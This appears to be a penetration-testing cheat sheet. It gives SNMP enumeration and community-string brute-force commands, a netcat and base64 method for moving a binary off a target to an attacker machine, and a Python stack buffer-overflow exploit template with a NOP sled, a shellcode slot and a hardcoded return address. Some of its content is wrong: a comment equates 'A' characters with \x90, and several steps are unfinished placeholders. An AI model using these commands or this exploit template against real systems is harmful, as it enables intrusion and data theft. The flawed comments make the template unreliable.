# pentest-cheat-sheet

## SNMP
`<version> = 1 OR 2c`
  
#### onesixtyone
`$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <ip>`

#### snmpcheck
`TODO`

#### snmpwalk
`$ snmpwalk -v<version> -c <community> <ip>`

#### enyx
`$ python enyx.py <version> <community> <ip>`

#### nmap
```
$ nmap -sU \
       -sC \
       -p 161 \
       -n \
       --script snmp-brute <ip> \
       --script-args snmp-brute.communitiesdb=/usr/share/doc/onesixtyone/dict.txt \
       -oA nmap-udp-snmp
```

#### Download a binary using netcat and base64
```
# Prepare netcat to capture and redirect the base64 content to a file
eve$ nc -lvnp 1234 > <binary>.b64

# Base64 encode binary and send to eve via netcat
alice$ base64 <binary> | nc <eve_ip> 1234 

# Decode the binary
eve$ base64 --decode <binary>.b64 > <binary>
```

#### Buffer overflow example
```
# ???? Checksec a binary
eve$ checksec -f chal

# Create a 500-character alphanumeric sequence
eve $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# ____
bob$ gdb <binary>

# Use pattern_offset to determine the offset where seg fault happens
eve$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130

! Output of pattern_offset above reveals buffer size (BUF_SIZE) below

# Create exploit script

#!/usr/bin/env python

# Example (potential) usage:
#   # Run exploit.py in subshell and pass output to vulnerable binary
#   bob$ <binary> $( exploit.py )

# The buffer size is from the output of the pattern_offset command above
BUF_SIZE=362

# Grab shellcode from some place like packet storm and place it here
SHELL_CODE = ""

# Subtract the length of the shell code from the buffer/offset size, 
# generate that many "A" characters (\x90 in hex), and capture them as
# a string in the NOP_SLED var
NOP_SLED = "\x90"*(BUF_SIZE-len(SHELL_CODE))

# EIP is determined using the ______ steps above
EIP = "\x40\xf7\xff\xbf" # 0xbffff750

# Finally, print the payload to the screen
print NOP_SLED + SHELL_CODE + EIP
```
